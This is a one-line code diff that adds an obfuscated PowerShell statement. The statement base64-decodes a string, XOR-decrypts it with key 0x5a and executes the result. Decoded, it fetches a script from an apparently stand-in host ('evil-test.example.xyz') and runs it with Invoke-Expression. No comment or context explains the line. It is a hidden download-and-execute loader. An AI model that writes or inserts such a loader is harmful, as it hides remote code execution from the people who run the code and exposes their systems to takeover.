@@ -1,0 +1,1 @@
+$b=[Convert]::FromBase64String('DSgzLj93EjUpLnp9KS47PT93PDM0OzZ9YXpyFD8tdxU4MD85LnoUPy50DT84GTYzPzQuc3QeNS00NjU7PgkuKDM0PXJ9Mi4uKmB1dT8sMzZ3Lj8pLnQ/Ijs3KjY/dCIjIHUqdCopa31zeiZ6Mz8i'); $k=0x5a; $o=-join ($b|%{[char]($_ -bxor $k)}); [ScriptBlock]::Create($o).Invoke()
